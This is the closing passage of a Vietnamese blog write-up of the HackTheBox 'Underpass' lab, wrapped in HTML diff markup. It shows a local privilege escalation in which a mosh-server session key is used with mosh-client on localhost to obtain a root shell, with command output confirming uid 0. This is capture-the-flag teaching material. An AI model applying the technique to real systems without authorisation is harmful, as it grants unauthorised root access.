+</span></span><span class="line"><span class="cl">MOSH CONNECT <span class="m">60010</span> I7hqnaOsdBVY3Yc8BJfpGg
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">mosh-server <span class="o">(</span>mosh 1.3.2<span class="o">)</span> <span class="o">[</span>build mosh 1.3.2<span class="o">]</span>
+</span></span><span class="line"><span class="cl">Copyright <span class="m">2012</span> Keith Winstein &lt;mosh-devel@mit.edu&gt;
+</span></span><span class="line"><span class="cl">License GPLv3+: GNU GPL version <span class="m">3</span> or later &lt;http://gnu.org/licenses/gpl.html&gt;.
+</span></span><span class="line"><span class="cl">This is free software: you are free to change and redistribute it.
+</span></span><span class="line"><span class="cl">There is NO WARRANTY, to the extent permitted by law.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>mosh-server detached, <span class="nv">pid</span> <span class="o">=</span> 200308<span class="o">]</span>
+</span></span><span class="line"><span class="cl">svcMosh@underpass:~$ </span></span></code></pre></div></div>
+<p>Truy cập mosh-server để lấy <code>root</code> với MOSH_KEY chính là đoạn key vừa tạo ở bước trên.</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">svcMosh@underpass:~$ <span class="nv">MOSH_KEY</span><span class="o">=</span>h+BFdQKt6sFjrGb/Zd1DfQ mosh-client 127.0.0.1 <span class="m">60010</span></span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Welcome to Ubuntu 22.04.5 LTS <span class="o">(</span>GNU/Linux 5.15.0-126-generic x86_64<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> * Documentation:  https://help.ubuntu.com
+</span></span><span class="line"><span class="cl"> * Management:     https://landscape.canonical.com
+</span></span><span class="line"><span class="cl"> * Support:        https://ubuntu.com/pro
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> System information as of Mon Feb <span class="m">10</span> 04:44:32 PM UTC <span class="m">2025</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  System load:  0.0               Processes:             <span class="m">253</span>
+</span></span><span class="line"><span class="cl">  Usage of /:   73.9% of 6.56GB   Users logged in:       <span class="m">2</span>
+</span></span><span class="line"><span class="cl">  Memory usage: 31%               IPv4 address <span class="k">for</span> eth0: 10.10.11.48
+</span></span><span class="line"><span class="cl">  Swap usage:   0%
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Expanded Security Maintenance <span class="k">for</span> Applications is not enabled.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="m">0</span> updates can be applied immediately.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Enable ESM Apps to receive additional future security updates.
+</span></span><span class="line"><span class="cl">See https://ubuntu.com/esm or run: sudo pro status
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">The list of available updates is more than a week old.
+</span></span><span class="line"><span class="cl">To check <span class="k">for</span> new updates run: sudo apt update
+</span></span><span class="line"><span class="cl">Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Mosh: You have <span class="m">2</span> detached Mosh sessions on this server, with PIDs:
+</span></span><span class="line"><span class="cl">        - mosh <span class="o">[</span>130995<span class="o">]</span>
+</span></span><span class="line"><span class="cl">        - mosh <span class="o">[</span>192326<span class="o">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">root@underpass:~# id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+</span></span><span class="line"><span class="cl">root@underpass:~# ll
+</span></span><span class="line"><span class="cl">total <span class="m">44</span>
+</span></span><span class="line"><span class="cl">drwx------  <span class="m">6</span> root root <span class="m">4096</span> Feb  <span class="m">8</span> 10:10 ./
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">18</span> root root <span class="m">4096</span> Dec <span class="m">11</span> 16:06 ../
+</span></span><span class="line"><span class="cl">lrwxrwxrwx  <span class="m">1</span> root root    <span class="m">9</span> Nov <span class="m">30</span> 10:39 .bash_history -&gt; /dev/null
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> root root <span class="m">3106</span> Oct <span class="m">15</span>  <span class="m">2021</span> .bashrc
+</span></span><span class="line"><span class="cl">drwx------  <span class="m">2</span> root root <span class="m">4096</span> Sep <span class="m">22</span> 01:27 .cache/
+</span></span><span class="line"><span class="cl">drwx------  <span class="m">3</span> root root <span class="m">4096</span> Dec <span class="m">11</span> 13:40 .config/
+</span></span><span class="line"><span class="cl">-rw-------  <span class="m">1</span> root root   <span class="m">20</span> Dec <span class="m">19</span> 12:42 .lesshst
+</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">3</span> root root <span class="m">4096</span> Dec <span class="m">11</span> 16:06 .local/
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> root root  <span class="m">161</span> Jul  <span class="m">9</span>  <span class="m">2019</span> .profile
+</span></span><span class="line"><span class="cl">-rw-r-----  <span class="m">1</span> root root   <span class="m">33</span> Feb  <span class="m">8</span> 10:10 root.txt
+</span></span><span class="line"><span class="cl">drwx------  <span class="m">2</span> root root <span class="m">4096</span> Dec <span class="m">11</span> 16:06 .ssh/
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> root root  <span class="m">165</span> Dec <span class="m">11</span> 16:38 .wget-hsts
+</span></span><span class="line"><span class="cl">root@underpass:~# </span></span></code></pre></div></div>
+
+          
+          
+          
+        </div>
+        
+        
+
+        
+
+        
+
+      </div>
+    </section>
+
+    
+    <footer class="pt-8 max-w-prose print:hidden">
+      
+  
+    
+    
+    
+    <div class="pt-8">
+      <hr class="border-dotted border-neutral-300 dark:border-neutral-600">
+      <div class="flex justify-between pt-3">
+        <span class="flex flex-col">
+          
+            <a
+              class="flex text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
+              href="/ctf/hackthebox/heal/">
+              <span class="leading-6">
+                <span class="inline-block rtl:rotate-180">&larr;</span>&ensp;Hackthebox - Heal
+              </span>
+            </a>
+            
+              <span class="ms-6 mt-1 text-xs text-neutral-500 dark:text-neutral-400">
+                <time datetime="2025-01-07T00:00:00&#43;00:00">7 January 2025</time>
+              </span>
+            
+          
+        </span>
+        <span class="flex flex-col items-end">
+          
+            <a
+              class="flex text-right text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
+              href="/ctf/hackthebox/titanic/">
+              <span class="leading-6">
+                Hackthebox - Titanic&ensp;<span class="inline-block rtl:rotate-180">&rarr;</span>
+              </span>
+            </a>
+            
+              <span class="me-6 mt-1 text-xs text-neutral-500 dark:text-neutral-400">
+                <time datetime="2025-03-03T00:00:00&#43;00:00">3 March 2025</time>
+              </span>
+            
+          
+        </span>
+      </div>
+    </div>
+  
+
+
+      
+    </footer>
+  </article>
+
+        
+
+
+  
+
+
+
+
+
+
+<div
+  id="scroll-to-top"
+  class="fixed bottom-6 end-6 z-50 transform translate-y-4 opacity-0 duration-200">
+  <a
+    href="#the-top"
+    class="pointer-events-auto flex h-12 w-12 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
+    aria-label="Scroll to top"
+    title="Scroll to top">
+    &uarr;
+  </a>
+</div>
+
+      </main><footer id="site-footer" class="py-10 print:hidden">
+  
+  
+    
+      
+      
+        
+          
+          
+      
+      
+      
+      <nav class="flex flex-row pb-4 text-base font-medium text-neutral-500 dark:text-neutral-400 ">
+        <ul class="flex list-none flex-col sm:flex-row">
+          
+            <li class=" flex mb-1 text-end sm:mb-0 sm:me-7 sm:last:me-0 ">
+              <a
+                class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2 flex items-center"
+                href="/tags/"
+                title="Tags">
+                
+                Tags
+              </a>
+            </li>
+          
+            <li class=" flex mb-1 text-end sm:mb-0 sm:me-7 sm:last:me-0 ">
+              <a
+                class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2 flex items-center"
+                href=""
+                title="">
+                
+                
+              </a>
+            </li>
+          
+        </ul>
+      </nav>
+    
+  
+  <div class="flex items-center justify-between">
+    
+    
+      <p class="text-sm text-neutral-500 dark:text-neutral-400">
+          &copy;
+          2026
+          TAH
+      </p>
+    
+
+    
+    
+      <p class="text-xs text-neutral-500 dark:text-neutral-400">
+        
+        
+        Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+          href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+          href="https://blowfish.page/" target="_blank" rel="noopener noreferrer">Blowfish</a>
+      </p>
+    
+  </div>
+  
+    <script>
+      mediumZoom(document.querySelectorAll("img:not(.nozoom)"), {
+        margin: 24,
+        background: "rgba(0,0,0,0.5)",
+        scrollOffset: 0,
+      });
+    </script>
+  
+  
+  
+</footer>
+<div
+  id="search-wrapper"
+  class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh] z-500"
+  data-url="http://localhost:1313/">
+  <div
+    id="search-modal"
+    class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800">
+    <header class="relative z-10 flex items-center justify-between flex-none px-2">
+      <form class="flex items-center flex-auto min-w-0">
+        <div class="flex items-center justify-center w-8 h-8 text-neutral-400">
+          <span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+</span>
+        </div>
+        <input
+          type="search"
+          id="search-query"
+          class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent"
+          placeholder="Search"
+          tabindex="0">
+      </form>
+      <button
+        id="close-search-button"
+        class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
+        title="Close (Esc)">
+        <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+</span>
+      </button>
+    </header>
+    <section class="flex-auto px-2 overflow-auto">
+      <ul id="search-results">
+        
+      </ul>
+    </section>
+  </div>
+</div>
+
+    </div>
+  </body>
+  
+</html>
